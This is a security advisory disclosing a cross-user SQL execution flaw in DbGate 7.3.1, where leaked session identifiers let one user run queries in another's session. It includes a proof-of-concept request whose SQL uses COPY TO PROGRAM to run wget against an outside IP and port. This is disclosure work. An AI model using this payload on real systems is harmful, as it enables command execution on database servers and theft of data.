# Cross-user SQL execution through leaked session identifiers

Identifier: `GHSA-xgr5-jrwx-vc8m`

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
```
Score: 8.8 (High).

Affected version: 7.3.1

## Description
This issue can be chained with [GHSA-297r-vfh5-2xqc](https://github.com/dbgate/dbgate/security/advisories/GHSA-297r-vfh5-2xqc) (aka [YonLiud/DbGate-sse-disclosure](https://github.com/YonLiud/DbGate-sse-disclosure)), which exposes active database session identifiers through the unauthenticated /stream endpoint.

After obtaining another user's `sesid`, a low-privilege authenticated user can submit it to `/sessions/execute-query` using their own valid bearer token.

```html
POST /sessions/execute-query
Authorization: Bearer ATTACKER_TOKEN
Content-Type: application/json
```
```json
{
  "sesid": "VICTIM_SESID",
  "sql": "COPY (SELECT '') TO PROGRAM 'wget -qO- http://172.26.242.223:4444/pwned'",
  "autoCommit": false
}
```

The endpoint verifies that the requester is authenticated, but does not verify that the requester owns the referenced database session or connection.

## Demo

https://github.com/user-attachments/assets/186d6b9b-a561-47e0-802e-df9e98eb41d4

This vulnerability was discovered by [YonLiud](https://github.com/YonLiud) and is provided “as is” for security research, education, and authorized testing purposes only.
The vulnerability was reported to the DbGate maintainers on September 20, 2026. No response or acknowledgment was received from the maintainers as of the date of publication.
This project must not be used for malicious purposes or against systems, networks, accounts, or data without explicit authorization from the owner. Any testing should be performed only in an isolated laboratory environment or within an explicitly authorized scope.
The author makes no warranties regarding this project and accepts no responsibility for damage, data loss, service disruption, unauthorized access, legal violations, or any other consequences resulting from its use, misuse, modification, or redistribution.
By downloading, executing, or using this project, you acknowledge that you are solely responsible for your actions and for complying with all applicable laws and regulations.
